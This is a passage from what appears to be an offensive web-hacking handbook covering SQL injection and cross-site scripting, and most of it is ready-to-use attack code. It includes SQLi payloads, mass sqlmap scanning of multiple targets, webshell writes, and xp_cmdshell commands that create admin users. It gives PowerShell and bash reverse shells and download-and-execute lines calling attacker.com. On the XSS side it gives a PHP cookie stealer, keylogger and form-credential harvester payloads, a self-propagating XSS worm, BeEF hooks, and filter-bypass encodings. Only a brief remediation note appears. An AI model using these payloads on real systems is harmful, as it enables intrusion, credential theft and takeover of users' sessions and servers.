comment: '; DROP TABLE logs-- -

-- When admin views logs:
SELECT * FROM logs WHERE user='admin'-- -'
-- Becomes:
SELECT * FROM logs WHERE user='admin'
```

**Exploitation Steps:**

```bash
# Step 1: Register with SQLi in username
curl http://target.com/register \
  -d "username=admin' UNION SELECT password FROM users WHERE username='realadmin'-- -" \
  -d "password=test123"

# Step 2: Trigger execution (admin panel viewing users)
# Admin queries: SELECT * FROM users WHERE username='admin' UNION...
# Leaks realadmin's password in display

# Step 3: Extract via profile or logs
curl -b "session=attacker_session" http://target.com/profile
```

### JSON SQLi

**SQL injection in JSON parameters:**

```json
// Standard JSON
{"username": "admin", "password": "pass"}

// SQLi in JSON
{"username": "admin' OR '1'='1", "password": "pass"}
{"username": "admin'-- -", "password": "pass"}

// Nested JSON
{"user": {"name": "admin' OR '1'='1"}}

// JSON with special characters (requires escaping)
{"username": "admin\\'-- -", "password": "pass"}
```

**Testing:**

```bash
# JSON SQLi test
curl -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1","password":"pass"}'

# Union-based JSON
curl -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' UNION SELECT NULL,NULL-- -","password":"pass"}'

# SQLMap with JSON
sqlmap -u "http://target.com/api/login" \
  --data='{"username":"admin","password":"pass"}' \
  -p username \
  --technique=BEUST
```

**JSON Array Injection:**

```json
// Array parameter
{"ids": [1, 2, 3]}

// Injection
{"ids": [1, "2' OR '1'='1", 3]}

// Union-based
{"ids": ["1' UNION SELECT password FROM users-- -"]}
```

### XML SQLi

**SQL injection through XML input:**

```xml
<!-- Standard XML -->
<user>
  <username>admin</username>
  <password>pass</password>
</user>

<!-- SQLi in XML -->
<user>
  <username>admin' OR '1'='1</username>
  <password>pass</password>
</user>

<!-- CDATA section (bypasses XML parsing) -->
<user>
  <username><![CDATA[admin' OR '1'='1]]></username>
  <password>pass</password>
</user>
```

**Testing:**

```bash
# XML SQLi
curl -X POST http://target.com/api/login \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><user><username>admin'\'' OR '\''1'\''='\''1</username><password>pass</password></user>'

# With CDATA
curl -X POST http://target.com/api/login \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><user><username><![CDATA[admin'\'' UNION SELECT password FROM users-- -]]></username></user>'
```

**XXE + SQLi Combo:**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <username>&xxe;</username>
  <password>admin' UNION SELECT NULL-- -</password>
</user>
```

### NoSQL Injection vs SQLi

**While this section focuses on SQL, understanding NoSQL injection differences is useful:**

**MongoDB (NoSQL):**

```javascript
// Vulnerable query
db.users.find({username: username, password: password})

// NoSQL injection
username[$ne]=admin&password[$ne]=pass
// Becomes: {username: {$ne: "admin"}, password: {$ne: "pass"}}
// Returns true if any user exists

// SQL equivalent would be:
SELECT * FROM users WHERE username != 'admin' AND password != 'pass'
```

**Testing:**

```bash
# NoSQL authentication bypass
curl http://target.com/login \
  -d 'username[$ne]=admin&password[$ne]=pass'

# JSON format
curl http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":"admin"},"password":{"$ne":"pass"}}'
```

### Database Fingerprinting

**Identifying the database type for targeted exploitation:**

**1. Version Strings:**

```sql
-- MySQL
' AND @@version LIKE '%MySQL%'-- -

-- PostgreSQL
' AND version() LIKE '%PostgreSQL%'-- -

-- MSSQL
' AND @@version LIKE '%Microsoft%'-- -

-- Oracle
' AND (SELECT banner FROM v$version WHERE ROWNUM=1) LIKE '%Oracle%'-- -

-- SQLite
' AND sqlite_version() LIKE '%'-- -
```

**2. String Concatenation Syntax:**

```sql
-- MySQL
'test'||'test' = 'testtest' (with PIPES_AS_CONCAT)
CONCAT('test','test') = 'testtest'

-- PostgreSQL
'test'||'test' = 'testtest'

-- MSSQL
'test'+'test' = 'testtest'

-- Oracle
'test'||'test' = 'testtest'
```

**3. Comment Syntax:**

```sql
-- MySQL specific
'/*! MySQL comment */

-- Multi-line
'/* comment */

-- Single line
'-- comment
'# comment (MySQL only)
```

**4. Function Differences:**

```sql
-- MySQL: LIMIT
' UNION SELECT NULL LIMIT 1-- -

-- MSSQL: TOP
' UNION SELECT TOP 1 NULL-- -

-- Oracle: ROWNUM
' UNION SELECT NULL FROM dual WHERE ROWNUM=1-- -

-- PostgreSQL: LIMIT
' UNION SELECT NULL LIMIT 1-- -
```

**5. Substring Syntax:**

```sql
-- MySQL
SUBSTRING('test',1,1)
SUBSTR('test',1,1)
MID('test',1,1)

-- PostgreSQL
SUBSTRING('test',1,1)
SUBSTR('test',1,1)

-- MSSQL
SUBSTRING('test',1,1)

-- Oracle
SUBSTR('test',1,1)
```

**Automated Fingerprinting:**

```bash
# SQLMap fingerprinting
sqlmap -u "http://target.com/product?id=1" --fingerprint

# Specific DBMS test
sqlmap -u "http://target.com/product?id=1" --dbms=MySQL --banner
```

### Mass SQL Injection (Automated Scanning)

**Scanning multiple targets for SQLi vulnerabilities:**

**1. Using SQLMap with URL list:**

```bash
# Create URL list
cat > urls.txt << EOF
http://target1.com/product?id=1
http://target2.com/page?id=2
http://target3.com/article?id=3
EOF

# Scan all URLs
while read url; do
  sqlmap -u "$url" --batch --dbs --output-dir=/tmp/sqlmap_results/
done < urls.txt
```

**2. Google Dorking for SQLi targets:**

```bash
# Find vulnerable pages
site:target.com inurl:product.php?id=
site:target.com inurl:page.php?id=
site:target.com inurl:article.php?id=

# Error-based discovery
site:target.com "mysql_fetch_array()"
site:target.com "You have an error in your SQL syntax"
site:target.com "Warning: mysqli"
```

**3. Automated crawler + SQLMap:**

```bash
# Crawl site
gospider -s http://target.com -o output -c 10 -d 2

# Extract URLs with parameters
cat output/* | grep "?" | sort -u > urls_with_params.txt

# Test each URL
cat urls_with_params.txt | while read url; do
  sqlmap -u "$url" --batch --risk=2 --level=2
done
```

**4. Burp Suite Site Map Export:**

```
1. Spider target in Burp
2. Target â†’ Site map
3. Right-click â†’ Copy URLs in this host
4. Save to file
5. Filter for parameter-based URLs:
   grep "?" urls.txt > urls_with_params.txt
6. Test with SQLMap
```

**5. Hakrawler + SQLMap:**

```bash
# Crawl and extract URLs
echo "http://target.com" | hakrawler -depth 3 -plain | grep "?" > urls.txt

# Mass SQLi scan
cat urls.txt | while read url; do
  sqlmap -u "$url" --batch --threads=5
done
```

### SQLi to Remote Code Execution

**Leveraging SQL injection for command execution:**

**MySQL (OUTFILE):**

```sql
-- Write webshell
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- -

-- Access shell
http://target.com/shell.php?cmd=id
http://target.com/shell.php?cmd=whoami
http://target.com/shell.php?cmd=cat /etc/passwd
```

**MSSQL (xp_cmdshell):**

```sql
-- Enable xp_cmdshell
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE-- -

-- Execute commands
'; EXEC xp_cmdshell 'whoami'-- -

-- Add user
'; EXEC xp_cmdshell 'net user hacker Pass123! /add'-- -
'; EXEC xp_cmdshell 'net localgroup administrators hacker /add'-- -

-- Download and execute
'; EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker.com/shell.ps1'')"'-- -

-- Reverse shell
'; EXEC xp_cmdshell 'powershell -c "$client=New-Object System.Net.Sockets.TCPClient(''attacker.com'',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+''PS ''+(pwd).Path+''> '';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'-- -
```

**PostgreSQL (COPY TO PROGRAM):**

```sql
-- Execute command
'; COPY (SELECT '') TO PROGRAM 'id'-- -

-- Write output to table
'; CREATE TABLE cmd_output(output text); COPY cmd_output FROM PROGRAM 'whoami'; SELECT * FROM cmd_output-- -

-- Reverse shell
'; COPY (SELECT '') TO PROGRAM 'bash -c ''bash -i >& /dev/tcp/attacker.com/4444 0>&1'''-- -

-- Download and execute
'; COPY (SELECT '') TO PROGRAM 'wget http://attacker.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh'-- -
```

**PostgreSQL (Large Objects):**

```sql
-- Create large object from string
'; SELECT lo_from_bytea(0, decode('<?php system($_GET[''cmd'']); ?>', 'escape'))-- -

-- Export to file
'; SELECT lo_export((SELECT max(oid) FROM pg_largeobject_metadata), '/var/www/html/shell.php')-- -
```

**SQLMap OS Shell:**

```bash
# Attempt automatic OS shell
sqlmap -u "http://target.com/product?id=1" --os-shell

# If successful, get interactive shell:
# os-shell> whoami
# os-shell> id
# os-shell> cat /etc/passwd

# Upload file
sqlmap -u "http://target.com/product?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

**Listener Setup:**

```bash
# Netcat listener for reverse shells
nc -lvnp 4444

# Multi-handler (for Metasploit payloads)
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST attacker_ip; set LPORT 4444; exploit"
```

### Important Remediation Notes

[Unverified] While exploiting SQLi, document findings for remediation:

**Recommended Fixes:**

- Use parameterized queries/prepared statements
- Input validation and sanitization
- Principle of least privilege for database users
- WAF implementation (defense in depth)
- Regular security audits

**Example Secure Code (Parameterized Query):**

```php
// Vulnerable
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";

// Secure (Prepared Statement)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->execute([$username, $password]);
```

---

# Cross-Site Scripting (XSS)

## XSS Fundamentals

Cross-Site Scripting (XSS) is a client-side code injection vulnerability that allows attackers to execute malicious JavaScript in the context of a victim's browser session. XSS occurs when web applications accept untrusted input and include it in web pages without proper validation or encoding.

**Attack Surface Components**

XSS vulnerabilities exist in three primary contexts:

- **HTML context**: Injected data appears within HTML body content
- **Attribute context**: Injected data appears within HTML tag attributes
- **JavaScript context**: Injected data appears within script blocks or event handlers

**Basic Exploitation Mechanism**

The attacker exploits insufficient input sanitization to inject JavaScript that executes with the same origin as the vulnerable application, bypassing the Same-Origin Policy (SOP). This allows access to:

- Session cookies and authentication tokens
- DOM manipulation capabilities
- Requests on behalf of the victim user
- Sensitive data within the page context

**Testing Methodology**

Identify injection points by submitting test payloads:

```bash
# Basic detection payloads
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
'"><script>alert(String.fromCharCode(88,83,83))</script>
```

**Kali Linux Testing Tools**

```bash
# XSSer - Automated XSS detection framework
xsser --url "http://target.com/search?q=test" --auto

# XSSer with cookie theft payload
xsser --url "http://target.com/page?input=XSS" \
  --Coo "document.location='http://attacker.com/steal?c='+document.cookie"

# Dalfox - Fast parameter analysis
dalfox url http://target.com/page?param=value

# Dalfox with blind XSS testing
dalfox url http://target.com/page?param=value \
  --blind http://your-collab-server.com
```

**Manual Testing with Burp Suite**

```bash
# Start Burp Suite
burpsuite

# Configure browser proxy: 127.0.0.1:8080
# Intercept requests and modify parameters
# Send to Intruder for payload fuzzing
```

In Burp Intruder, use payload lists from:

```bash
/usr/share/seclists/Fuzzing/XSS/XSS-Bypass-Filters-Evasion.txt
/usr/share/seclists/Fuzzing/XSS/XSS-Somdev.txt
```

**Context-Specific Payload Construction**

HTML Context:

```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
```

Attribute Context:

```html
" onmouseover="alert(1)
' autofocus onfocus='alert(1)
">><script>alert(1)</script>
```

JavaScript Context:

```javascript
'-alert(1)-'
';alert(1);//
\';alert(1);//
```

**Encoding and Filter Bypass Techniques**

HTML entity encoding bypass:

```html
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
```

Case variation bypass:

```html
<ScRiPt>alert(1)</sCrIpT>
<ImG sRc=x OnErRoR=alert(1)>
```

NULL byte injection [Inference]:

```html
<scri%00pt>alert(1)</scri%00pt>
<img src=x onerr%00or=alert(1)>
```

## Reflected XSS

Reflected XSS occurs when malicious input is immediately returned in the HTTP response without proper sanitization. The payload is not stored on the server and requires social engineering to deliver the malicious link to victims.

**Identification Methodology**

Test all user-controllable input points:

- URL parameters (`?search=`, `?id=`, `?page=`)
- HTTP headers (User-Agent, Referer, custom headers)
- Form inputs (search boxes, login forms, feedback forms)

**Exploitation Workflow**

1. Identify reflection point:

```bash
# Test parameter reflection
curl "http://target.com/search?q=UNIQUE_STRING_12345"

# Check if input appears in response
curl "http://target.com/search?q=<test>" | grep "<test>"
```

2. Test basic payload:

```bash
# URL-encoded payload
curl "http://target.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E"

# Use Firefox/Chrome developer tools to verify execution
```

3. Refine payload based on context:

```bash
# If input appears in attribute
curl "http://target.com/search?q=%22%20onmouseover=%22alert(1)"

# If inside JavaScript variable
curl "http://target.com/search?q=%27;alert(1);//"
```

**Advanced Reflected XSS Techniques**

Parameter pollution:

```bash
# Some parsers take first parameter, others take last
http://target.com/page?param=safe&param=<script>alert(1)</script>

# HPP testing with Burp Param Miner extension
```

Header-based reflection:

```bash
# Test User-Agent reflection
curl -A "<script>alert(1)</script>" http://target.com/page

# Test Referer header
curl -H "Referer: <script>alert(1)</script>" http://target.com/page

# Test custom headers
curl -H "X-Custom: <script>alert(1)</script>" http://target.com/page
```

**Session Hijacking via Reflected XSS**

Setup cookie stealer server:

```bash
# Simple Python HTTP server logging
python3 -m http.server 8080

# PHP cookie stealer (stealer.php)
cat > /var/www/html/stealer.php << 'EOF'
<?php
$cookie = $_GET['c'];
$ip = $_SERVER['REMOTE_ADDR'];
$timestamp = date('Y-m-d H:i:s');
file_put_contents('cookies.txt', "[$timestamp] $ip: $cookie\n", FILE_APPEND);
?>
EOF
```

Payload construction:

```javascript
<script>
document.location='http://attacker.com/stealer.php?c='+document.cookie
</script>

// Alternative: Image beacon
<script>
new Image().src='http://attacker.com/steal?c='+document.cookie
</script>

// XMLHttpRequest exfiltration
<script>
fetch('http://attacker.com/steal?c='+document.cookie)
</script>
```

**WAF Bypass Techniques for Reflected XSS**

Using HTML5 tags:

```html
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
```

Polyglot payloads:

```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
```

Character encoding:

```bash
# Unicode normalization
\u003cscript\u003ealert(1)\u003c/script\u003e

# UTF-7 encoding (legacy browsers)
+ADw-script+AD4-alert(1)+ADw-/script+AD4-
```

**Automated Reflected XSS Scanning**

```bash
# XSSer automated scanning
xsser --url "http://target.com/search?q=XSS" \
  --auto \
  --cookie="session=abc123" \
  --threads=10

# Dalfox comprehensive scan
dalfox url http://target.com/search?q=FUZZ \
  --silence \
  --mass \
  --mining-dict

# OWASP ZAP automated scan
zap-cli quick-scan --self-contained \
  --spider -r http://target.com
```

## Stored XSS

Stored XSS (persistent XSS) occurs when malicious input is saved to the server database and displayed to other users without proper output encoding. This is generally higher severity than reflected XSS because it requires no user interaction beyond visiting the infected page.

**Common Stored XSS Locations**

- User profile fields (bio, signature, username)
- Comment systems and forums
- Blog posts and article content
- File upload metadata (filename, description)
- Support ticket systems
- Review and rating systems
- Social media posts and messages

**Identification and Testing**

1. Identify persistent data entry points:

```bash
# Register account and test profile fields
# Submit comments on vulnerable pages
# Upload files with malicious filenames
```

2. Test payload persistence:

```bash
# Submit test payload
curl -X POST http://target.com/comment \
  -d "comment=<script>alert(1)</script>" \
  -b "session=abc123"

# Verify storage by visiting page in different session
curl http://target.com/viewcomments
```

3. Monitor payload execution across user contexts

**Exploitation Scenarios**

Basic cookie theft for persistent XSS:

```javascript
<script>
var img = new Image();
img.src = 'http://attacker.com/log?cookie=' + encodeURIComponent(document.cookie);
</script>
```

Keylogger payload:

```javascript
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/keylog?key=' + e.key);
}
</script>
```

Admin panel detection and credential harvesting:

```javascript
<script>
if(document.location.pathname.includes('admin')) {
    var forms = document.getElementsByTagName('form');
    for(var i=0; i<forms.length; i++) {
        forms[i].addEventListener('submit', function(e) {
            var formData = new FormData(e.target);
            var data = {};
            formData.forEach((value, key) => data[key] = value);
            fetch('http://attacker.com/harvest', {
                method: 'POST',
                body: JSON.stringify(data)
            });
        });
    }
}
</script>
```

**Stored XSS Worm Propagation** [Inference]

Self-replicating XSS (similar to Samy worm):

```javascript
<script>
// Read own malicious code
var payload = document.getElementById('xss-payload').innerHTML;

// Find comment submission form
var form = document.querySelector('form[action*="comment"]');
if(form) {
    // Inject payload into comment field
    form.querySelector('textarea').value = payload;
    
    // Auto-submit after delay
    setTimeout(function() { form.submit(); }, 5000);
}
</script>
<div id="xss-payload" style="display:none">
<!-- Store payload here for self-replication -->
</div>
```

**Stored XSS via File Upload**

SVG file with embedded XSS:

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" 
"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    alert(document.domain);
  </script>
</svg>
```

HTML file upload:

```html
<!DOCTYPE html>
<html>
<body>
<script>
alert(document.domain);
document.location='http://attacker.com/steal?c='+document.cookie;
</script>
</body>
</html>
```

Filename-based XSS:

```bash
# Upload file with malicious filename
touch '"><img src=x onerror=alert(1)>.jpg'

# Use curl to preserve special characters
curl -F "file=@\'\"><img src=x onerror=alert(1)>.jpg" \
  http://target.com/upload
```

**Database-Level Stored XSS Testing**

SQL injection to stored XSS:

```bash
# Inject XSS payload via SQL injection
sqlmap -u "http://target.com/profile?id=1" \
  --technique=U \
  --sql-query="UPDATE users SET bio='<script>alert(1)</script>' WHERE id=1"
```

**BeEF Framework Integration**

BeEF (Browser Exploitation Framework) allows persistent browser hooking:

```bash
# Start BeEF
beef-xss

# Default credentials: beef:beef
# Web UI: http://127.0.0.1:3000/ui/panel

# Hook script location
http://127.0.0.1:3000/hook.js
```

Stored XSS payload with BeEF hook:

```html
<script src="http://attacker.com:3000/hook.js"></script>
```

Once hooked, BeEF provides modules for:

- Browser and system fingerprinting
- Network scanning from victim's network
- Social engineering attacks
- Credential harvesting
- Persistent backdoors

**Mitigation Testing**

Verify output encoding:

```bash
# Test HTML encoding
echo '<script>alert(1)</script>' should display as text

# Test attribute encoding
echo '" onload="alert(1)' should not break out of attribute

# Test JavaScript encoding
echo "'; alert(1); //" should not break script context
```

## DOM-based XSS

DOM-based XSS occurs entirely client-side when JavaScript code processes untrusted data in an unsafe manner, modifying the DOM without proper sanitization. The payload never reaches the server in HTTP requests/responses.

**DOM XSS Sources (User-Controllable Input)**

Common sources of tainted data:

- `document.URL`
- `document.documentURI`
- `document.baseURI`
- `location.href`
- `location.search`
- `location.hash`
- `document.referrer`
- `window.name`
- `postMessage` event data
- Web Storage (`localStorage`, `sessionStorage`)

**DOM XSS Sinks (Dangerous Functions)**

JavaScript functions that execute code or render HTML:

- `eval()`
- `setTimeout()` / `setInterval()` (with string argument)
- `Function()` constructor
- `innerHTML`
- `outerHTML`
- `document.write()` / `document.writeln()`
- `element.insertAdjacentHTML()`
- `location` assignment (`location.href`, `location.assign()`)
- `script.src` assignment
- `script.text` / `script.textContent`
- jQuery functions: `$()`, `.html()`, `.append()`, etc.

**Identification Methodology**

1. Static code analysis:

```bash
# Search for dangerous sinks in JavaScript files
grep -r "innerHTML" /path/to/js/files/
grep -r "document.write" /path/to/js/files/
grep -r "eval(" /path/to/js/files/
grep -r "location.href" /path/to/js/files/

# Download all JavaScript files from target
wget -r -l1 -H -nd -A.js http://target.com
```

2. Use browser developer tools:

```javascript
// Monitor DOM changes
var observer = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
        console.log(mutation);
    });
});
observer.observe(document.body, {
    childList: true,
    subtree: true
});
```

3. Dynamic analysis with DOM Invader (Burp Suite):

- Enable DOM Invader in browser
- Set canary value (e.g., `domxss`)
- Navigate application and observe injections

**Common DOM XSS Patterns**

Pattern 1 - URL parameter to innerHTML:

```javascript
// Vulnerable code
var search = location.search.substring(1);
document.getElementById('result').innerHTML = "You searched for: " + search;

// Exploit
http://target.com/page?query=<img src=x onerror=alert(1)>
```

Pattern 2 - Hash fragment to eval:

```javascript
// Vulnerable code
var action = location.hash.substring(1);
eval('do_' + action + '()');

// Exploit
http://target.com/page#alert(1)
```

Pattern 3 - postMessage to document.write:

```javascript
// Vulnerable code
window.addEventListener('message', function(e) {
    document.write(e.data);
});

// Exploit from attacker-controlled page
<iframe src="http://target.com/vulnerable"></iframe>
<script>
frames[0].postMessage('<img src=x onerror=alert(1)>', '*');
</script>
```

Pattern 4 - jQuery sink:

```javascript
// Vulnerable code
var input = location.hash.substring(1);
$('#output').html(input);

// Exploit
http://target.com/page#<img src=x onerror=alert(1)>
```

**Testing Tools for DOM XSS**

DOMPurify bypass testing:

```javascript
// Test if DOMPurify is used
<svg><style><img src=x onerror=alert(1)>

// Mutation XSS (mXSS) attempts
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

Automated DOM XSS scanning with DOM Invader:

```
1. Install Burp Suite Professional
2. Enable Browser â†’ Embedded browser (Chromium)
3. Enable DOM Invader extension
4. Configure injection points (URL, hash, postMessage, etc.)
5. Browse application with auto-fire enabled
```

Manual testing with browser console:

```javascript
// Test each potential source
console.log(document.URL);
console.log(location.hash);
console.log(document.referrer);

// Inject test payloads
location.hash = '#<img src=x onerror=alert(1)>';
window.name = '<img src=x onerror=alert(1)>';

// Monitor execution
window.addEventListener('error', function(e) {
    console.log('Error event triggered:', e);
}, true);
```

**Advanced DOM XSS Exploitation**

AngularJS sandbox escape (versions < 1.6):

```javascript
// Template injection
{{constructor.constructor('alert(1)')()}}

// Event handler context
<input ng-focus="$event.view.alert(1)" autofocus>

// Filter bypass
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
```

Client-side template injection:

```javascript
// Vue.js
{{_c.constructor('alert(1)')()}}

// React (indirect)
dangerouslySetInnerHTML={{__html: userInput}}

// Handlebars
{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "alert(1)"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
```

Prototype pollution to DOM XSS [Inference]:

```javascript
// Pollute Object prototype
Object.prototype.sourceURL = '\u0000alert(1)';

// If application uses polluted property in dangerous sink
eval(obj.sourceURL); // Triggers alert
```

**DOM Clobbering**

Technique using HTML ID/name attributes to overwrite JavaScript globals:

```html
<!-- Clobber variable used in conditional -->
<form id="isAdmin"></form>
<script>
if(window.isAdmin) {
    // Attacker reaches this branch
    location.href = userInput; // Now exploitable
}
</script>

<!-- Clobber object property -->
<a id="config" href="http://attacker.com"></a>
<script>
// If code expects config.apiUrl
location = config.href; // Redirects to attacker.com
</script>
```

**Defense Bypass Techniques**

Content Security Policy (CSP) bypass via DOM XSS:

```javascript
// If CSP allows 'unsafe-inline' or specific domains
<script src="https://whitelisted-domain.com/angular.js"></script>
<div ng-app ng-csp>
{{constructor.constructor('alert(1)')()}}
</div>

// Base tag injection
<base href="http://attacker.com/">
// Forces relative script/link tags to load from attacker domain
```

**DOM XSS via Third-Party Libraries**

Check for vulnerable library versions:

```bash
# Retire.js - Check for vulnerable JavaScript libraries
retire --path /path/to/js/files

# Online scanning
retire --js --jspath http://target.com
```

Common vulnerable libraries:

- jQuery < 3.5.0 (CVE-2020-11022, CVE-2020-11023)
- AngularJS < 1.6 (template injection)
- Lodash < 4.17.21 (prototype pollution)
- Bootstrap < 3.4.0 (data-target XSS)

**Recommended Tools and Extensions**

Browser extensions for DOM XSS testing:

- DOM Invader (Burp Suite Pro)
- Tainted Love (monitors tainted data flow)
- XSS Validator (confirms XSS execution)

Kali Linux tools:

```bash
# Install additional tools
pip3 install -U xsstrike
pip3 install truffleHog

# XSStrike for DOM XSS detection
xsstrike --url http://target.com/page

# JavaScript analysis
cat script.js | grep -E 'innerHTML|document.write|eval\('
```

---

**Critical Testing Considerations**

When testing XSS vulnerabilities in CTF environments:

1. **Check multiple contexts**: HTML, attribute, JavaScript, URL
2. **Test both GET and POST parameters**
3. **Examine HTTP headers for reflection**
4. **Analyze all JavaScript files for DOM sinks**
5. **Test with different browsers** (Chrome, Firefox, Safari handle edge cases differently)
6. **Monitor network traffic** for out-of-band payloads
7. **Use encoding when necessary** (URL, HTML entity, Unicode)
8. **Chain vulnerabilities** (XSS + CSRF, XSS + open redirect)

---

## Payload Encoding and Obfuscation

### URL Encoding

Basic URL encoding replaces special characters with percent-encoded equivalents:

```bash
# Standard encoding
<script>alert(1)</script>
%3Cscript%3Ealert(1)%3C%2Fscript%3E

# Double encoding (bypasses some filters)
%253Cscript%253Ealert(1)%253C%252Fscript%253E
```

### HTML Entity Encoding

Entities can bypass filters that check for literal characters:

```html
<!-- Decimal entities -->
&#60;script&#62;alert(1)&#60;/script&#62;

<!-- Hexadecimal entities -->
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;

<!-- Named entities -->
&lt;script&gt;alert(1)&lt;/script&gt;
```

[Inference] Mixed encoding within attributes may bypass certain WAF rules:

```html
<img src=x on&#101;rror="alert(1)">
<img src=x on\u0065rror="alert(1)">
```

### JavaScript Encoding

Unicode escapes in JavaScript contexts:

```javascript
// Unicode escape sequences
\u003cscript\u003ealert(1)\u003c/script\u003e

// Hex escapes
\x3cscript\x3ealert(1)\x3c/script\x3e

// Octal escapes (older browsers)
\74script\76alert(1)\74/script\76
```

### Base64 Encoding

Useful for data URIs and obfuscation:

```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

Encoding with command-line tools:

```bash
# Encode payload
echo -n '<script>alert(1)</script>' | base64
# Output: PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

# Decode for verification
echo 'PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' | base64 -d
```

### String Obfuscation Techniques

String concatenation and character code conversion:

```javascript
// Concatenation
eval('ale'+'rt(1)')

// fromCharCode
String.fromCharCode(97,108,101,114,116,40,49,41)

// Template literals
eval`alert\x281\x29`

// Computed member access
window['ale'+'rt'](1)
window[String.fromCharCode(97,108,101,114,116)](1)
```

### JSFuck Encoding

[Unverified] JSFuck encodes JavaScript using only six characters: `[]()!+`. Tools available:

```bash
# Using online JSFuck encoder or local tools
# Example output for alert(1)
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+...
```

### Case Manipulation

Mixed case can bypass case-sensitive filters:

```html
<ScRiPt>alert(1)</sCrIpT>
<sCrIpT>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
```

### Automated Obfuscation Tools

Using `beef-xss` payloads (Kali Linux):

```bash
# Start BeEF framework
sudo beef-xss

# Access at http://127.0.0.1:3000/ui/panel
# Default credentials: beef:beef
# Hook script: http://127.0.0.1:3000/hook.js
```

Basic hook payload:

```html
<script src="http://ATTACKER_IP:3000/hook.js"></script>
```

## Context-Aware Payloads

### HTML Context

Standard HTML body context allows direct script injection:

```html
<!-- Direct injection -->
<script>alert(document.domain)</script>

<!-- Event handlers -->
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<svg onload=alert(1)>

<!-- Less common tags -->
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<input onfocus=alert(1) autofocus>
```

### Attribute Context

Breaking out depends on quote usage and filtering:

```html
<!-- Double-quoted attribute -->
"><script>alert(1)</script>
" onmouseover="alert(1)
" autofocus onfocus="alert(1)

<!-- Single-quoted attribute -->
'><script>alert(1)</script>
' onmouseover='alert(1)
' autofocus onfocus='alert(1)

<!-- Unquoted attribute (space-delimited) -->
x onmouseover=alert(1)
x autofocus onfocus=alert(1)
```

### JavaScript String Context

Escaping from JavaScript strings within `<script>` tags:

```javascript
// Double-quoted string
</script><script>alert(1)</script>
'; alert(1); //
'; alert(1); var dummy='

// Single-quoted string
</script><script>alert(1)</script>
'; alert(1); //
'; alert(1); var dummy='

// Template literals
${alert(1)}
`; alert(1); //
```

### JavaScript Variable Assignment

```javascript
// When input is: var x = 'USER_INPUT';
// Payload
'; alert(1); var dummy='
// Results in: var x = ''; alert(1); var dummy='';
```

### Event Handler Context

Already within an event handler attribute:

```html
<!-- When inside onclick="USER_INPUT" -->
alert(1)
alert(1); return false
alert(document.cookie)

<!-- Multistatement with semicolons -->
alert(1); void(0);
```

### URL Context

JavaScript protocol handlers:

```html
<a href="javascript:alert(1)">Click</a>
<iframe src="javascript:alert(1)">
<form action="javascript:alert(1)">

<!-- Data URIs -->
